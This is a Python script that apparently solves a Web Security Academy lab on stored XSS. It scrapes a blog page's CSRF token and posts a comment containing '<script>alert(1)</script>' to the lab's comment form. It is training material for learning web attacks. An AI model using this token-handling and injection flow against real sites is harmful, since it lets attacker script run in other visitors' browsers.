# Lab: Stored XSS into HTML context with nothing encoded

import requests
import re


base = "https://0a14002604adaa7e82296561003400c5.web-security-academy.net"
blog_session = requests.Session()
'''
when i comment on blog post the request sends below:

POST /post/comment
csrf=va6fvqcIBB0cfbjaltllCcD3NxlCSHmE&postId=8&comment=1&name=2&email=3%40abc.ddddd&website=https%3A%2F%2F0a14002604adaa7e82296561003400c5.web-security-academy.net%2Fpost%3FpostId%3D
'''

print("===========[step1] Access Blog Then get CSRF Value===============")
page_blog=blog_session.get(f"{base}/post", params={"postId": 8}, allow_redirects=False)
# print(type(page_blog))
# print(type(page_blog.text))
csrf = re.search(r'name="csrf" value="(\w+)"', page_blog.text).group(1)
print(csrf)

print("===========[step2] Leave Comment===============")
website="https://0a14002604adaa7e82296561003400c5.web-security-academy.net/post?postId=8"
page_comment=blog_session.post(f"{base}/post/comment", data={"csrf": csrf, "postId": 8, "comment": "<script>alert(1)</script>", "name": "test", "email": "test@test.com", "website":website}, allow_redirects=False)
print(page_comment.status_code)
print(page_comment.text)

